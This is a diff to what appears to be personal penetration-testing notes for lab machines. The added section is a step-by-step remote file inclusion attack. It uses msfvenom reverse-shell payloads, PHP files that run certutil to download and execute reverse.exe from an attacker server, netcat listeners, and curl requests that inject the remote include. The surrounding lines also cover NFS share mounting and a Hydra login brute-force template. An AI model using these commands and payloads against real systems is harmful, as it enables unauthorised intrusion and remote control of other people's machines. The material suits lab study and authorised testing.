@@ -41,6 +41,31 @@ mount
 					/site_backups (everyone)
 		- Mount the share: mount -t nfs -o vers=3 <address of machine>:<share name or path> /mnt/nfs
 			- $ mount -t nfs -o vers=3 remote.htb:/site_backups /mnt/nfs
+			
+How to test for LFT:
+	- nc -lnvp 80
+	- curl http://192.168.79.53:4443/site/index.php?page=http://192.168.49.79/hi 
+	- if a proper response with hi in it, then move on to uploading a shell: 
+	Method 1:
+		- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.79 LPORT=4443(website port) -f exe > reverse.exe 
+	- We need to create two PHP file. We will name them “step1.php” and “step2.php”. In step 1, we include PHP code to reach back to our HTTP server and download our reverse shell, reverse.exe. In step 2, we include PHP code to run the .exe from the box.
+		- step1.php: 
+				<?php 
+$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.68/reverse.exe" shell.exe', $val); 
+?> 
+		- step2.php:
+				<?php 
+$exec = system('reverse.exe', $val); 
+?> 
+	- Start http server where the files are: python2 -m SimpleHTTPServer 80
+	- Grab step1: curl http://192.168.79.53:4443/site/index.php?page=http://192.168.49.79/step1.php
+	- start nc: nc -lnvp 4443
+	- Grab step2: curl http://192.168.79.53:4443/site/index.php?page=http://192.168.49.79/step2.php
+	Method 2: 
+	 - msfvenom -p php/reverse_php LHOST=192.168.49.213 LPORT=443 -f raw > shell.php
+	 - nc -lnvp 443
+	 - curl http://192.168.213.53:8080/site/index.php?page=http://192.168.49.213/shell.php
+	Note: If method 1 fails at the last step, use the 2nd method to execute the exe file.
 Hydra: 
 	- How to brute force a login page
 		- sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
